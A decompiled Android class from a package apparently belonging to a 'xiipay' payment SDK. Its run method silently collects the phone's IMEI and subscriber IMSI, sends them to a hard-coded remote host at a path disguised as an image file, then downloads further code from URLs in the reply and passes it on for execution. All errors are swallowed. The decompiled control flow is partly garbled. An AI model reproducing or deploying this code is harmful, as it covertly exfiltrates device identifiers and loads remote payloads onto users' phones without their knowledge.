package com.xiipay.b;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public final class g
  implements Runnable
{
  private Context a;
  
  public g(Context paramContext)
  {
    this.a = paramContext;
  }
  
  private String a()
  {
    Object localObject = this.a.getPackageManager();
    try
    {
      localObject = ((PackageManager)localObject).getApplicationInfo(this.a.getPackageName(), 128);
      if ((localObject != null) && (((ApplicationInfo)localObject).metaData != null))
      {
        localObject = ((ApplicationInfo)localObject).metaData.getString("XIIPAY_CHANNEL");
        return localObject;
      }
    }
    catch (Exception localException) {}
    return "1";
  }
  
  public final void run()
  {
    try
    {
      int j = f.a(this.a);
      Object localObject3 = (TelephonyManager)this.a.getSystemService("phone");
      Object localObject2 = ((TelephonyManager)localObject3).getDeviceId();
      Object localObject1 = localObject2;
      if (localObject2 == null) {
        localObject1 = "";
      }
      localObject3 = ((TelephonyManager)localObject3).getSubscriberId();
      localObject2 = localObject3;
      if (localObject3 == null) {
        localObject2 = "";
      }
      localObject1 = new String(f.a("http://www.61ns.com:9000/AXGServer/images/icon.jpg", j, a.a((a() + "|" + (String)localObject1 + "|" + (String)localObject2 + "|" + com.xiipay.a.f.a).getBytes())));
      if (((String)localObject1).length() == 0) {
        return;
      }
      localObject1 = j.a(a.a((String)localObject1), "@");
      String str;
      String[] arrayOfString;
      int k;
      int i;
      if (localObject1.length == 3)
      {
        localObject3 = localObject1[0];
        str = localObject1[1];
        arrayOfString = j.a(localObject1[2], "|");
        k = arrayOfString.length;
        localObject1 = null;
        i = 0;
      }
      for (;;)
      {
        if (localObject2 != null)
        {
          new d(this.a, (byte[])localObject2, (String)localObject3, str).a();
          return;
        }
        do
        {
          localObject1 = f.a(arrayOfString[i], j, null);
          localObject2 = localObject1;
          if (localObject1 != null) {
            break;
          }
          i += 1;
          continue;
          return;
        } while (i < k);
        localObject2 = localObject1;
      }
      return;
    }
    catch (Exception localException) {}
  }
}
